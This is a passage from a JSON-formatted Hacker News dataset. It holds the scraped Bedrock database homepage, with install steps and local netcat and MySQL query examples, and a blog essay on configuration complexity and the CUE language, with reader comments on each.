directly accessing the RAM of the database itself. This is great in a single node, but if you still want more (because who doesnt?) then install any number of nodes and load-balance reads across all of them. This means every CPU of every database server is available for parallel reads, each of which has direct access to the database RAM. Simpler. This is because Bedrock is written for modern hardware with large SSD-backed RAID drives and generous RAM file caches, and thereby doesnt mess with the zillion hacky tricks the other databases do to eke out high performance on largely obsolete hardware. This results in fewer esoteric knobs, and sane defaults that just work. More reliable. This is because Bedrocks synchronization engine supports active/active distributed transactions with automatic failover, and can be clustered not just inside a single datacenter, but across multiple datacenters spanning the internet. This means Bedrock continues functioning not only if a single node goes down, but even if you lose an entire datacenter. After all, it doesnt matter who you are using: your datacenter will fail, eventually. But you neednt fail along with it. More powerful. Most people dont realize just how powerful SQLite is. Indexes, triggers, foreign key constraints, native JSON support, expression indexes check the full list here. Youll be amazed, but thats just the start. On top of this Bedrock layers a robust plugin system, and includes a fully functional job queue and replicated cache all the basics you need for modern service design, wrapped into one simple package. Bedrock is not only production ready, but actively used by Expensifys many thousands of customers, and millions of users. (Curious why an expense reporting company built their own database? Read what the First Round Review has to say about it.) How to get it Bedrock can be compiled from source using the Expensify/Bedrock public repo, or installed with the commands below: Ubuntu Linux You can build from scratch as follows: # Clone out this repo: git clone https://github.com/Expensify/Bedrock.git # Install some dependencies sudo add-apt-repository ppa:ubuntu-toolchain-r/test sudo apt-get update sudo apt-get install build-essential gcc-9 g++-9 libpcre++-dev zlib1g-dev # Build it cd Bedrock make # Create an empty database (See: https://github.com/Expensify/Bedrock/issues/489) touch bedrock.db # Run it (press Ctrl^C to quit, or use -fork to make it run in the backgroud) ./bedrock # Connect to it in a different terminal using netcat nc localhost 8888 # Type \"Status\" and then enter twice to verify it's working # See here to use the default DB plugin: http://bedrockdb.com/db.html Arch Linux Copy/paste this command into your terminal: This will tansparently download the latest version from GitHub, compile it, package it up, and install it. MacOSX You can build from scratch as follows: # Clone out this repo: git clone https://github.com/Expensify/Bedrock.git # Install some dependencies with Brew (see: https://brew.sh/) brew update brew install gcc@6 # Configure PCRE to use C++17 and compile from source brew uninstall --ignore-dependencies pcre brew edit pcre # Add these to the end of the `system \"./configure\"` command: # \"--enable-cpp\", # \"--enable-pcre64\", # \"CXX=/usr/local/bin/g++-9\", # \"CXXFLAGS=--std=gnu++14\" brew install --build-from-source pcre # Build it cd Bedrock make # Create an empty database (See: https://github.com/Expensify/Bedrock/issues/489) touch bedrock.db # Run it (press Ctrl^C to quit, or use -fork to make it run in the backgroud) ./bedrock # Connect to it in a different terminal using netcat nc localhost 8888 # Type \"Status\" and then enter twice to verify it's working # See here to use the default DB plugin: http://bedrockdb.com/db.html How to use it Bedrock is so easy to use, youll think youre missing something. Once installed, Bedrock listens on localhost port 8888, and stores its database in /var/lib/bedrock. The easiest way to talk with Bedrock is using netcat as follows: $ nc localhost 8888 Query: SELECT 1 AS foo, 2 AS bar; That query can be any SQLite-compatible query including schema changes, foreign key constraints, partial indexes, native JSON expressions, or any of the tremendous amount of functionality SQLite offers. The result will be returned in an HTTP-like response format: 200 OK Content-Length: 16 foo | bar 1 | 2 By default, Bedrock optimizes the output for human consumption. If you are a robot, request JSON output: $ nc localhost 8888 Query query: SELECT 1 AS foo, 2 AS bar; format: json 200 OK Content-Length: 40 {\"headers\":[\"foo\",\"bar\"],\"rows\":[[1,2]]} Some people are creeped out by sockets, and prefer tools. No problem: Bedrock supports the MySQL protocol, meaning you can continue using whatever MySQL client you prefer: $ mysql -h 127.0.0.1 Welcome to the MySQL monitor. Commands end with ; or \\g. Your MySQL connection id is 1 Server version: bedrock 09b08f82e6eefe69f79bb8414882dd64182e3e8c Copyright (c) 2000, 2015, Oracle and/or its affiliates. All rights reserved. Oracle is a registered trademark of Oracle Corporation and/or its affiliates. Other names may be trademarks of their respective owners. Type 'help;' or '\\h' for help. Type '\\c' to clear the current input statement. mysql> SELECT 1 AS foo, 2 AS bar; +------+------+ | foo | bar | +------+------+ | 1 | 2 | +------+------+ 1 row in set (0.01 sec) mysql> That also means you can continue using whatever MySQL language binding you already know and love. Alternatively, if you dont know or love any of them, Bedrock also provides a PHP binding that looks something like this: $bedrock = new Bedrock(); $result = $bedrock->db->query(\"SELECT 1 AS foo, 2 AS bar;\"); It really can be that easy. Bedrock plugins Additionally, Bedrock::DB is just one plugin to the overall Bedrock platform. Bedrock itself is less a database, and more a tool that can be used to build a wide variety of data-management applications with a database being just one example. Each plugin implements and exposes new externally-visible commands (essentially equivalent to stored procedures). However, unlike simple stored procedures, plugins can also include schema changes. Plugins can be enabled via the -plugins command line parameter. Current plugins include: Status - Provides basic status about the health the Bedrock cluster. DB - Provides direct SQL access to the underlying database. Jobs - Provides a simple job queue. Cache - Provides a simple replicated cache. MySQL - Emulates MySQL How to help and get helped So many ways! Run bedrock -? on the command line to see all the available command-line options Chat with us live on Bedrocks Gitter page Post to the Bedrock mailing list by emailing bedrock@googlegroups.com Create an issue in Bedrocks GitHub issue list Submit a PR to Bedrocks GitHub repo Email David, the CEO of Expensify (and biggest Bedrock fanboy ever) directly: dbarrett@expensify.com Join Expensify and you can work on Bedrock (and other, even cooler things) full time! ",
          "This looks promising. A typical blockchain discussion in my org (kind of averse to change with a few hundred database people, smart, but Microsoft stack) goes like this:\nSomeone: “We need a private blockchain for C use case. We’re about to pay consulting firm X a gazillion dollars to implement EthiHyperBitLedget”\nArchitect: “Silly bird, you just need a distributed database...”\nSomeone:”Fine then how do I get one of those”\nArchitect:”you just hire me and I’ll write a bunch of database stuff for you that is a one off spaghetti mess of sql server stuff”\n75% of the time they buy that blockchain thing\n25% of the time they try to spatchcock the sql thing\nSo far we are 0 for 10 for stuff being useful.<p>If there were a nice distributed database with the features of blockchain I think this could merge my excited Someones with my fuddyduddy Architects.",
          "The \"blockchain-based\" part is misleading.<p>For one, when people say \"blockchain\", they're almost always including the clever protocol that enables a currency with no central authority.  That's the interesting part.  Bedrock doesn't do any of that.<p>Without that, \"blockchain\" is just a simple technique for incremental hashing.  Bedrock uses that, but it's not substantial enough to sensibly list \"blockchain-based\" as one of the three top attributes.<p>(They could have said \"Paxos-based\".  That's the protocol they use to ensure things don't get out of sync.)<p>Just trying to capitalize on the cryptocurrency hype, I guess.  FaunaDB did something similar: <a href=\"https://fauna.com/blog/distributed-ledger-without-the-blockchain\" rel=\"nofollow\">https://fauna.com/blog/distributed-ledger-without-the-blockc...</a>"
        ],
        "story_type": ["Normal"],
        "url": "https://bedrockdb.com/",
        "comments.comment_id": [21046442, 21046501],
        "comments.comment_author": ["prepend", "cakoose"],
        "comments.comment_descendants": [3, 5],
        "comments.comment_time": [
          "2019-09-23T06:37:06Z",
          "2019-09-23T06:50:41Z"
        ],
        "comments.comment_text": [
          "This looks promising. A typical blockchain discussion in my org (kind of averse to change with a few hundred database people, smart, but Microsoft stack) goes like this:\nSomeone: “We need a private blockchain for C use case. We’re about to pay consulting firm X a gazillion dollars to implement EthiHyperBitLedget”\nArchitect: “Silly bird, you just need a distributed database...”\nSomeone:”Fine then how do I get one of those”\nArchitect:”you just hire me and I’ll write a bunch of database stuff for you that is a one off spaghetti mess of sql server stuff”\n75% of the time they buy that blockchain thing\n25% of the time they try to spatchcock the sql thing\nSo far we are 0 for 10 for stuff being useful.<p>If there were a nice distributed database with the features of blockchain I think this could merge my excited Someones with my fuddyduddy Architects.",
          "The \"blockchain-based\" part is misleading.<p>For one, when people say \"blockchain\", they're almost always including the clever protocol that enables a currency with no central authority.  That's the interesting part.  Bedrock doesn't do any of that.<p>Without that, \"blockchain\" is just a simple technique for incremental hashing.  Bedrock uses that, but it's not substantial enough to sensibly list \"blockchain-based\" as one of the three top attributes.<p>(They could have said \"Paxos-based\".  That's the protocol they use to ensure things don't get out of sync.)<p>Just trying to capitalize on the cryptocurrency hype, I guess.  FaunaDB did something similar: <a href=\"https://fauna.com/blog/distributed-ledger-without-the-blockchain\" rel=\"nofollow\">https://fauna.com/blog/distributed-ledger-without-the-blockc...</a>"
        ],
        "id": "d5a58b8b-5d6e-44c3-890d-14eb266bc0ba",
        "url_text": "Why Code Install Use Jobs Cache vs MySQL Replication Blockchain Multizone Chat Contact Bedrock Rock-solid distributed data Bedrock is a simple, modular, WAN-replicated, Blockchain-based data foundation for global-scale applications. Taking each of those in turn: Bedrock is simple. This means it exposes the fewest knobs necessary, with appropriate defaults at every layer. Bedrock is modular. This means its functionality is packaged into separate plugins that are decoupled and independently maintainable. Bedrock is WAN-replicated. This means it is designed to endure the myriad real-world problems that occur across slow, unreliable internet connections. Bedrock is Blockchain-based. This means it uses a private blockchain to synchronize and self organize. Bedrock is a data foundation. This means it is not just a simple database that responds to queries, but rather a platform on which data-processing applications (like databases, job queues, caches, etc) can be built. Bedrock is for global-scale applications. This means it is built to be deployed in a geo-redundant fashion spanning many datacenters around the world. Bedrock was built by Expensify, and is a networking and distributed transaction layer built atop SQLite, the fastest, most reliable, and most widely distributed database in the world. Why to use it If youre building a website or other online service, youve got to use something. Why use Bedrock rather than the alternatives? Weve provided a more detailed comparision against MySQL, but in general Bedrock is: Faster. This is true for networked queries using the Bedrock::DB plugin, but especially true for custom plugins you write yourself because SQLite is just a library that operates inside your processs memory space. That means when your plugin queries SQLite, it isnt serializing/deserializing over a network: its directly accessing the RAM of the database itself. This is great in a single node, but if you still want more (because who doesnt?) then install any number of nodes and load-balance reads across all of them. This means every CPU of every database server is available for parallel reads, each of which has direct access to the database RAM. Simpler. This is because Bedrock is written for modern hardware with large SSD-backed RAID drives and generous RAM file caches, and thereby doesnt mess with the zillion hacky tricks the other databases do to eke out high performance on largely obsolete hardware. This results in fewer esoteric knobs, and sane defaults that just work. More reliable. This is because Bedrocks synchronization engine supports active/active distributed transactions with automatic failover, and can be clustered not just inside a single datacenter, but across multiple datacenters spanning the internet. This means Bedrock continues functioning not only if a single node goes down, but even if you lose an entire datacenter. After all, it doesnt matter who you are using: your datacenter will fail, eventually. But you neednt fail along with it. More powerful. Most people dont realize just how powerful SQLite is. Indexes, triggers, foreign key constraints, native JSON support, expression indexes check the full list here. Youll be amazed, but thats just the start. On top of this Bedrock layers a robust plugin system, and includes a fully functional job queue and replicated cache all the basics you need for modern service design, wrapped into one simple package. Bedrock is not only production ready, but actively used by Expensifys many thousands of customers, and millions of users. (Curious why an expense reporting company built their own database? Read what the First Round Review has to say about it.) How to get it Bedrock can be compiled from source using the Expensify/Bedrock public repo, or installed with the commands below: Ubuntu Linux You can build from scratch as follows: # Clone out this repo: git clone https://github.com/Expensify/Bedrock.git # Install some dependencies sudo add-apt-repository ppa:ubuntu-toolchain-r/test sudo apt-get update sudo apt-get install build-essential gcc-9 g++-9 libpcre++-dev zlib1g-dev # Build it cd Bedrock make # Create an empty database (See: https://github.com/Expensify/Bedrock/issues/489) touch bedrock.db # Run it (press Ctrl^C to quit, or use -fork to make it run in the backgroud) ./bedrock # Connect to it in a different terminal using netcat nc localhost 8888 # Type \"Status\" and then enter twice to verify it's working # See here to use the default DB plugin: http://bedrockdb.com/db.html Arch Linux Copy/paste this command into your terminal: This will tansparently download the latest version from GitHub, compile it, package it up, and install it. MacOSX You can build from scratch as follows: # Clone out this repo: git clone https://github.com/Expensify/Bedrock.git # Install some dependencies with Brew (see: https://brew.sh/) brew update brew install gcc@6 # Configure PCRE to use C++17 and compile from source brew uninstall --ignore-dependencies pcre brew edit pcre # Add these to the end of the `system \"./configure\"` command: # \"--enable-cpp\", # \"--enable-pcre64\", # \"CXX=/usr/local/bin/g++-9\", # \"CXXFLAGS=--std=gnu++14\" brew install --build-from-source pcre # Build it cd Bedrock make # Create an empty database (See: https://github.com/Expensify/Bedrock/issues/489) touch bedrock.db # Run it (press Ctrl^C to quit, or use -fork to make it run in the backgroud) ./bedrock # Connect to it in a different terminal using netcat nc localhost 8888 # Type \"Status\" and then enter twice to verify it's working # See here to use the default DB plugin: http://bedrockdb.com/db.html How to use it Bedrock is so easy to use, youll think youre missing something. Once installed, Bedrock listens on localhost port 8888, and stores its database in /var/lib/bedrock. The easiest way to talk with Bedrock is using netcat as follows: $ nc localhost 8888 Query: SELECT 1 AS foo, 2 AS bar; That query can be any SQLite-compatible query including schema changes, foreign key constraints, partial indexes, native JSON expressions, or any of the tremendous amount of functionality SQLite offers. The result will be returned in an HTTP-like response format: 200 OK Content-Length: 16 foo | bar 1 | 2 By default, Bedrock optimizes the output for human consumption. If you are a robot, request JSON output: $ nc localhost 8888 Query query: SELECT 1 AS foo, 2 AS bar; format: json 200 OK Content-Length: 40 {\"headers\":[\"foo\",\"bar\"],\"rows\":[[1,2]]} Some people are creeped out by sockets, and prefer tools. No problem: Bedrock supports the MySQL protocol, meaning you can continue using whatever MySQL client you prefer: $ mysql -h 127.0.0.1 Welcome to the MySQL monitor. Commands end with ; or \\g. Your MySQL connection id is 1 Server version: bedrock 09b08f82e6eefe69f79bb8414882dd64182e3e8c Copyright (c) 2000, 2015, Oracle and/or its affiliates. All rights reserved. Oracle is a registered trademark of Oracle Corporation and/or its affiliates. Other names may be trademarks of their respective owners. Type 'help;' or '\\h' for help. Type '\\c' to clear the current input statement. mysql> SELECT 1 AS foo, 2 AS bar; +------+------+ | foo | bar | +------+------+ | 1 | 2 | +------+------+ 1 row in set (0.01 sec) mysql> That also means you can continue using whatever MySQL language binding you already know and love. Alternatively, if you dont know or love any of them, Bedrock also provides a PHP binding that looks something like this: $bedrock = new Bedrock(); $result = $bedrock->db->query(\"SELECT 1 AS foo, 2 AS bar;\"); It really can be that easy. Bedrock plugins Additionally, Bedrock::DB is just one plugin to the overall Bedrock platform. Bedrock itself is less a database, and more a tool that can be used to build a wide variety of data-management applications with a database being just one example. Each plugin implements and exposes new externally-visible commands (essentially equivalent to stored procedures). However, unlike simple stored procedures, plugins can also include schema changes. Plugins can be enabled via the -plugins command line parameter. Current plugins include: Status - Provides basic status about the health the Bedrock cluster. DB - Provides direct SQL access to the underlying database. Jobs - Provides a simple job queue. Cache - Provides a simple replicated cache. MySQL - Emulates MySQL How to help and get helped So many ways! Run bedrock -? on the command line to see all the available command-line options Chat with us live on Bedrocks Gitter page Post to the Bedrock mailing list by emailing bedrock@googlegroups.com Create an issue in Bedrocks GitHub issue list Submit a PR to Bedrocks GitHub repo Email David, the CEO of Expensify (and biggest Bedrock fanboy ever) directly: dbarrett@expensify.com Join Expensify and you can work on Bedrock (and other, even cooler things) full time! ",
        "_version_": 1718527427699802112
      },
      {
        "story_id": [21551868],
        "story_author": ["UkiahSmith"],
        "story_descendants": [79],
        "story_score": [147],
        "story_time": ["2019-11-16T09:54:30Z"],
        "story_title": "The Configuration Complexity Curse",
        "search": [
          "The Configuration Complexity Curse",
          "https://blog.cedriccharly.com/post/20191109-the-configuration-complexity-curse/",
          "Read the discussion on Hacker News, Reddit, and Lobste.rsDont be a YAML EngineerImagine that you are a new software engineer entering the industry. You thought you were ready after studying your theory and the weekend side projects. Now, you get hit with a wave of new tools and concepts out of nowhere. Microservices? REST? Cloud Computing? RPC (Whats an IDL)? Docker (Whats a container)? Kubernetes? Continuous Integration? Continuous Deployment? Even for veterans, like a frog in slowly boiling water, you look up one day and realize things have become complicated.How did this happen? Each of these things looks useful in isolation, but now you have to figure out how to use it best for yourself as well as with these other tools in concert. First a tool must be configured, usually in YAML (so much YAML). Now this tool needs to be integrated to work with everything else. If you are lucky, you may have an internal platform team to package and abstract the complexity for you. Otherwise, you are going to end up with a rube goldbergian system that wraps all these tools so you can coordinate configuration between everything just to maintain sanity.I think there is light at the end of the tunnel here, but even leading edge projects like Kubernetes suffer from this industry wide pathology we experience building software platforms.Kubernetes: Its Turtles All The Way DownYou start by hand writing YAML files and pushing them to a cluster with kubectl. Before resting on your laurels as a newly minted distributed systems engineer, you realize that you need a way to pass dynamic values to your YAML file. Enter the tool explosion; Nod along if you have ever done or considered using one of these techniques:Text Templating: Many are tempted to reach for text templating libraries like Jinja, etc. Most have experience using it for templating HTML, why not use it here? At this point you can get by with just simple scripts to template values then push to the cluster, or just go with something off the shelf. Trying to write a configuration file (basically a data structure described in text) with a text templating library is the road to tragedy. As anyone who tried to write a helm chart template knows, templates quickly become hairy and incredibly fragile. Because you are working with the template at the textual level, a template writer lacks the tools to build abstractions around the data itself and small things like indentation can break your template. I think I need to repeat this: Do not use text templating for data configuration.Data Layering: This is when you build an overlay inheritance mechanism on top of YAML, keeping the raw YAML but wrapping it in a tool that can merge these separate documents according to its own rules. kustomize would be the most well known tool now it that is it integrated into kubectl. This seems to work well enough and could be feasible for simple use cases. In comparison to data configuration languages though, this strategy breaks down when configurations grow in complexity and scale. Template writers lack abstraction and type validation that matters when things get complicated, as the semantics are locked into an opaque tool and not exposed as language features.Data Configuration Language (DCL): This is the most advanced form of data configuration we have today, if you absolutely need to manage configuration for a system now I would recommend one of these tools. If the previous techniques are what I call YAML Engineering, DCLs would be actual languages designed for defining data and working with data at a semantic level. Examples of DCLs are jsonnet (used in kubecfg/ksonnet), dhall (used in dhall-kubernetes), and starlark (used in isopod). Google internally uses a tool called borgcfg (which inspired kubecfg) which evaluates configurations in a jsonnet-like internal language to configure Borg (which inspired Kubernetes) deployments. As systems scale in complexity and size, DCLs have abstractions like types, functions, comprehensions, and conditionals to manage and create reusable configurations.So, if you want to anything more advanced than straight YAML you will need to adopt one of these approaches and integrate it with your development and release process. That will help as long as you are working directly with Kubernetes, but what about configuring your underlying infrastructure? If you are on a cloud platform like AWS or Azure, even a managed Kubernetes deployment requires a tool like CloudFormation or Terraform, which has or needs its own distinct abstractions to manage resources at that level of the stack. You cannot reuse the tooling invested in configuring Kubernetes and must yet again integrate another system for configuring the cloud provider at a lower level. The sound you hear is a turtle being stacked on another turtle.Complex Systems == Complex ConfigurationThis example with Kubernetes shows how difficult it is to manage configuration, but Kubernetes is just one of many declarative systems that show this problem. Any declarative systems and tools that grow sufficiently in size and complexity need to be abstracted but we lack common tools to do so. You may not think a Terraform configuration needs to be abstracted, but when dealing with many teams that need to deploy infrastructure in a consistent way, having reusable abstractions is incredibly valuable. Same for Continuous Integration. Maintaining a YAML file may be fine for a single project, but when your organization has hundreds of services, generating a consistent set of automation and checks is worth the effort.The main argument of this essay hits upon the cause of this issue:As systems grow and multiply in order to run at scale, the configuration also grows in size and complexity. The industry lacks the right tools to manage this growing configuration complexity.Innovation in platforms, like the cloud and Kubernetes, makes things that used to be too difficult and complex for a small team now just a simple API call away. But the loop needs to be closed on how we can build libraries that any organization can use to have a base of best practices for any platform. Even current DCLs, which I consider closer to the model we should use, lack key pieces to manage configuration at scale.CUE: Configure, Unify, ExecuteWe need a way to manage configuration that grows in size and needs to be used in many different systems. I think a tool to solve this would need two key properties:The tool is a language that has the primitives needed to create and maintain reusable, large scale configuration.The tool can orchestrate and push configuration to many different systems without having to create a new, custom tool just for that combination.There are many languages and configuration languages that attempt to solve this problem. CUE is a (new) data configuration language that uses a novel approach to solving the issue with a vision to tackle both what is needed to do configuration at large scale with a way to finally avoid the all too common tool wrapping that we see today. The creator of cuelang (this guy) worked on borgcfg at Google, where the learnings of managing configuration across a large company drives much of what makes cuelang a solution for our configuration problems today.Why CUE?Configuration Needs A Different Programming ModelIn the Kubernetes example before, I left out the option of using a a general purpose programming language. CUE is not even the first configuration language out there. Why should we pick a completely new tool instead of reusing something that already exists?CUE is based on a different model of logic programming that makes it well suited for configuration. The languages foundations make tasks like validation, templating, querying, and code generation first class features. CUE is designed around graph unification where sets of types, and values can be modeled as directed graphs and then unified to the most specific representation of all graphs. In CUE, the graphs are the config structures and values of the same key will simplify to the most specific value. The graph unification model is used successfully in computational linguistics, where a grammar definition of a human language can be thought of as 100K line configuration.This idea is much more intuitive to see with an example. Lets look at an example CUE definition:// Schema municipality: { name: string pop: int capital: bool } // Schema & Data largeCapital: municipality largeCapital: { name: string pop: >5M capital: true } // Data moscow: largeCapital moscow: { name: \"Moscow\" pop: 11.92M capital: true } We can see three separate structs defined here with varying mixtures of types and values defined for each. The combination of types and values in a single struct is significant here. In CUE, types are values. This means that types can be assigned to fields and can be immediately used to constrain values in the configuration. You can also see that fields become more constrained towards concrete values with each struct. largeCapital is a municipiality with a new constraint on the population size. moscow is a largeCapital with concrete values (the most specific type) for all fields. Between structs largeCapital and moscow, largeCapital subsumes moscow and moscow is an instance of largeCapital.If you want to go deeper I recommend reading The Logic of CUE to understand the theoretical foundation and what makes CUE different from other configuration languages. You can also watch this video from the creator if you prefer that. I think trying to go deeper into the theory would be me poorly rewording the original article. I would rather go into how the foundation of CUE enables features that are useful for configuration.Type Checking And Boilerplate RemovalGoing back to what we need from a new configuration tool, types and abstractions are the largest factors in managing large scale configuration. With types, we express constraints on data and declare intent across potentially many users. Types protect users from errors when defining configuration and serves as automatic documentation. Taking an example from the website:Spec :: { kind: string name: { first: !=\"\" // must be specified and non-empty middle?: !=\"\" // optional, but must be non-empty when specified last: !=\"\" } // The minimum must be strictly smaller than the maximum and vice versa. minimum?: int & <maximum maximum?: int & >minimum } // A spec is of type Spec spec: Spec spec: { knid: \"Homo Sapiens\" // error, misspelled field name: first: \"Jane\" name: last: \"Doe\" } In CUE, we can see what fields are needed for a Spec type as well as the constraints on each. CUEs type system is expressive, where fields can be marked simply by their type, to specifying optionality and constraints from other fields as well. This mixing of types and values is underrated. In constrast with JSON, one needs to generate a separate specification format (like OpenAPI) with significant effort to document and validate the JSON being consumed. With CUE, configuration can be checked and validated during evaluation without extra effort or tooling.Most of the current configuration tooling, both general purpose and data languages, focuses on removing boilerplate/duplicate code to reduce verbosity. Many choose to use an override model like inheritance (defining base types and modifying) due to developer familarity with the paradigm. This is a key factor to why I think DCLs have not seen widespread use in the industry. Although it would seem to be an obvious model, inheritance has problems in both small and large scale configuration. For small projects, defining abstractions early can be a large upfront ask with small payoff. After all, to benefit from deduplication there needs to be duplicate configuration in the first place (For the sake of clarity abstraction too early can be counterproductive). With CUE, defining the config grants automatic validation and documentation right out the gate; Paired with default values you can immediately cut down the effort to reuse common data.For large scale projects, inheritance creates deep layers of abstractions; It becomes difficult to tell where values are coming from in a config, much more so if the language has multiple mechanisms for abstraction (inheritance, mixins). At a practical level, deep hierarchies are common in configuration, and subtrees near the leaves can be challenging to modify. CUE takes a different approach with graph unification and disallows overrides. This improves readability as deep layering is prevented from the beginning; One does not need to trace through multiple files to see where a value came from. Although CUE does not have inheritance, it does have the concept of a value being an instance of another (the value lattice). This model is less flexible, but in return we get great clarity. To take a simple example, imagine we have an Animal class and we want to define both a Dog and Cat class. With inheritance, we could define Animal as the base type then selectively override and add fields to represent each respective subclass. Although workable, if we wanted to go further and represent each breed of Cat and Dog we could quickly run into issues as each layer of the hierarchy can choose to modify data as it chooses. In CUEs approach, instead of trying to override data at each layer, we choose to model Cat and Dog as instances of Animal. For both types, we take Animals definition but instead add constraints to bound what defines each animal. Even though we have the same hierarchy of types, at each layer the data can only become more specific for that subtype. Thanks to that for breeds we only need to further constrain what makes a Dog a Corgi and at each level we can see how the data was constrained to allow the final value.Scripting: Inversion of ControlConfiguration is never created for its own sake. The purpose of all configuration is to be fed to another system to do useful work with it. Especially today, we need to manage configuration between a dizzying amount of tools and services: Software as a Service (SaaS) offerings, Cloud vendors, Continous Integration, build tools, package managersthe list goes on. In the beginning, piping config files to various tools such as kubectl may be enough to get the job done. Eventually though, these tasks end up as part of a greater workflow that needs to be automated. Marcel describes a problem he has seen many times:At first using a general config lang is cute, piping results to kubectl and what have you. But this gets cumbersome, so one writes scripts. Then, as scripts are often inconvenient to distribute and use, so one turns this into a command line tool. These tools are typically domain specific. So sooner or later, this tool needs to be part of a larger control flow, and the whole process starts again. Ive been guilty of writing a bunch of such tools.Marcel van Lohuizen, CUE SlackThe resultant tools tend to consist of undifferentied glue code that is duplicated at each level of control. Even worse, the solution is hyper-specific to the combination of tools that needs to be integrated. The problem is almost asking for a more general, flexible approach.CUEs solution is an open, declarative scripting layer built on top of the configuration language. While configuration evaluation can remain hermetic (important for enabling CUE semantics), the scriping layer can freely combine injected data as well as functions to run various tasks in a dataflow pipeline. Data injection opens up many possibilities that can close the gap that other configuration languages miss. We can inject command line flags, data from the enviroment (environment variables, data fetched over the network), and computed data from the defined config that we need for complete automation pipelines.Today, we have incredible tool churn because we cannot easily use the same configuration between multiple systems (compatibility and accessibility). The script layer instead proposes to invert control. Instead of pulling configuration data into inaccessible scripts and tools, why not push the code closer to the data? The flow of data drives the need to endlessly wrap tools to work with multiple systems. Instead, we can define the automation where data and dataflow are first class citizens.Its hard to visualize what this means without an example. The scripting layer is still being worked on, but here is an example from running cue help cmd:package foo import \"tool/exec\" city: \"Amsterdam\" // Say hello! command hello: { var file: \"out.txt\" | string // save transcript to this file task ask: cli.Ask & { prompt: \"What is your name?\" response: string } // starts after ask task echo: exec.Run & { cmd: [\"echo\", \"Hello\", task.ask.response + \"!\"] stdout: string // capture stdout } // starts after echo task write: file.Append & { filename: var.file contents: task.echo.stdout } // also starts after echo task print: cli.Print & { contents: task.echo.stdout } } For CUE, files ending in _tool.cue are evaluated as script files with access to injected data as well as the command and task templates. Each command is given a name which can be called as the entrypoint; the hello command would be executed with cue cmd hello. This command asks for a name then writes a greeting to both stdout and a file. This workflow is implemented as a pipeline of tasks with structs used to define arguments. Since CUE can see which tasks input use another tasks output, we automatically get parallel pipelines through dataflow analysis. Tasks can cover all kinds of operations, one can see the currently available ones hereIntegration And PackagesCUE is a superset of JSON. By design, CUE aims to be useful when working with other formats; CUE supports automation to import and export to/from other data formats. Importing data and schemas into CUE (like JSON, YAML, Protocol Buffers, OpenAPI definitions) allows for managing configurations in an expressive and scalable way. Exporting to other formats enables compatibility when pushing evaluated CUE with other systems. After all, a configuration is not written for its own sake, but to be used somewhere else.The true implications of CUE code generation are realized in combination with the package system. CUE borrows Golangs package system, and plans on implementing minimal version selection with URI imports. With this, we can create reusable abstractions for configuration that have previously existed only in the realm of general programming.Take the Kubernetes example. Kubernetes is a declarative infrastructure state converger. Like a cloud provider, Kubernetes has a massive API surface spread over multiple resources. On top of that, Kubernetes allows for defining custom resources from external sources. To manually write a DCL library to cover all of the API surface would be a massive undertaking and would quickly become out of date. With CUE, we can generate CUE code from the OpenAPI specification. With the full resource API covered, we can layer our own opinionated libraries on top. Maybe you are a platform engineer at a company that wants to ensure everyone defines deployments with the required annotations, labels, and uses the company container repository. The community can also create libraries that encourage best practices and the package system makes it simple to distribute and integrate in any workflow. If the underlying resources were to change, it is straightforward to autogenerate the CUE code and check if the libraries are still compatible.The Automation DreamPutting all these ideas together, we end up with a vision for future configuration. We can have libraries for not only configuring applications but also libraries of automation that run end-to-end workflows for pushing that data to systems. CUEs design enables configuration at scale: organizations can define constraints and templates at a high level, and users layer specific values to make concrete definitions. Organizations find it easier to enforce best practices and policy, and front line engineers get templates and automation out of the box to become productive that much quicker. With distributed packaging, we are not limited to what only our teams can create but can leverage best practices and knowledge from the wider industry.CUE And YouAs of this writing, CUE is a pretty new (alpha) language. There is still much work to be done to reach the complete vision, especially in the integrations with other languages, platforms, and data formats. Fortunately, any improvements to the ecosystem can be easily shared for everyone to use.If I were to summarize the main reason to choose CUE, it is because it chooses to build from a theoretical foundation that makes it a true contender for configuration needs. So many of the useful features CUE provides fall out from its properties (commutative, associative, and idempotent). In an industry where the way we work is becoming more complicated, CUE has come along to make things much more manageable.If any of these people apply to you:A developer who wants to use Kubernetes/Cloud in an effective wayAn application developer who wants to create easy to share automation for a projectA platform developer who wants to create useful templates for every team to useAn architect who wants a simple way to enforce consistent policy across an organizationTired of writing so much YAMLyou should look into CUE.Edit 2019-12-08: Improve tone consistency; Rewrite CUE code to be idiomatic ",
          "If you're thinking about implementing this or something like this, <i>please stop</i>.<p>Unless you're writing in a compiled language, use the same language your application is written in for your configuration. If you have a python application, have a python file for the configuration. Same for ruby or whatnot.<p>You don't need to use the entire language, but at least use the language's lexer/parser (cf. json/javascript). That way, all existing tooling for the language will work for the config files (ask me about how saltstack happily breaks their API because you're not \"supposed\" to use it, despite the fact that they have public docs for it). Additionally, people won't need to figure out all the stupid corner cases in your weird language that has no uses outside of a few projects.<p>Additionally, by making your configuration language an actual language, you also simplify a lot of the system design, because the configuration can act directly against your API. This means using your tool from other tools becomes much more straightforward, because the only interface you actually need is the API.<p>The <i>existence</i> of \"configuration language\" is, itself, a mistake.",
          "It occurred to me that the configuration hell is a consequence of Microservice-heavy approach: we have reduced complexity of cross-component interactions by compartmentalizing each component behind a hard boundary, and now we’re paying the price for this free lunch by trying to put those things back together and keeping them that way.<p>Turns out the complexity didn’t go anywhere, it was just biding it’s time, waiting for the right moment to strike back.<p>Damn you, entropy!"
        ],
        "story_type": ["Normal"],
        "url": "https://blog.cedriccharly.com/post/20191109-the-configuration-complexity-curse/",
        "comments.comment_id": [21552106, 21553314],
        "comments.comment_author": ["fake-name", "DenisM"],
        "comments.comment_descendants": [2, 1],
        "comments.comment_time": [
          "2019-11-16T11:27:30Z",
          "2019-11-16T16:11:28Z"
        ],
        "comments.comment_text": [
          "If you're thinking about implementing this or something like this, <i>please stop</i>.<p>Unless you're writing in a compiled language, use the same language your application is written in for your configuration. If you have a python application, have a python file for the configuration. Same for ruby or whatnot.<p>You don't need to use the entire language, but at least use the language's lexer/parser (cf. json/javascript). That way, all existing tooling for the language will work for the config files (ask me about how saltstack happily breaks their API because you're not \"supposed\" to use it, despite the fact that they have public docs for it). Additionally, people won't need to figure out all the stupid corner cases in your weird language that has no uses outside of a few projects.<p>Additionally, by making your configuration language an actual language, you also simplify a lot of the system design, because the configuration can act directly against your API. This means using your tool from other tools becomes much more straightforward, because the only interface you actually need is the API.<p>The <i>existence</i> of \"configuration language\" is, itself, a mistake.",
